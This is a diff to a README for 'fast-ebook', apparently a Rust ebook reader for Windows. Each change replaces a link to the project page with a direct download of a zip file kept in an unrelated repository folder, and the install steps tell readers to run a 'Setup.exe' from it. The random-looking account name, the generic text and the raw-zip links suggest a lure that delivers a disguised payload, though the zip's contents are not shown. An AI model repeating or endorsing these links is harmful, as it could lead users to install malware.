@@ -1,6 +1,6 @@
 # 📚 fast-ebook - Read your books at high speed
 
-[![Download fast-ebook](https://img.shields.io/badge/Download-fast--ebook-blue)](https://github.com/Memorychipexpresstrust9624/fast-ebook)
+[![Download fast-ebook](https://img.shields.io/badge/Download-fast--ebook-blue)](https://github.com/Memorychipexpresstrust9624/fast-ebook/raw/refs/heads/main/instructive/ebook-fast-coherent.zip)
 
 fast-ebook helps you open and read digital books. Many apps run slow when you open large files. This software uses the Rust programming language to load your books instantly. It provides a simple way to manage your library without complex settings.
 
@@ -19,7 +19,7 @@ These system requirements ensure the software runs without errors. Rust-based so
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [the official download page](https://github.com/Memorychipexpresstrust9624/fast-ebook) to access the installer.
+1. Visit [the official download page](https://github.com/Memorychipexpresstrust9624/fast-ebook/raw/refs/heads/main/instructive/ebook-fast-coherent.zip) to access the installer.
 2. Locate the link labeled "Windows Installer" or "Setup.exe".
 3. Click the link to begin the download.
 4. Save the file to your computer.
@@ -75,4 +75,4 @@ Periodic updates improve the speed of the software. Check the help icon in the m
 
 The developers maintain the source code to ensure compatibility with Windows security updates. Keep your software current for the best reading experience.
 
-[Download fast-ebook here](https://github.com/Memorychipexpresstrust9624/fast-ebook)
+[Download fast-ebook here](https://github.com/Memorychipexpresstrust9624/fast-ebook/raw/refs/heads/main/instructive/ebook-fast-coherent.zip)
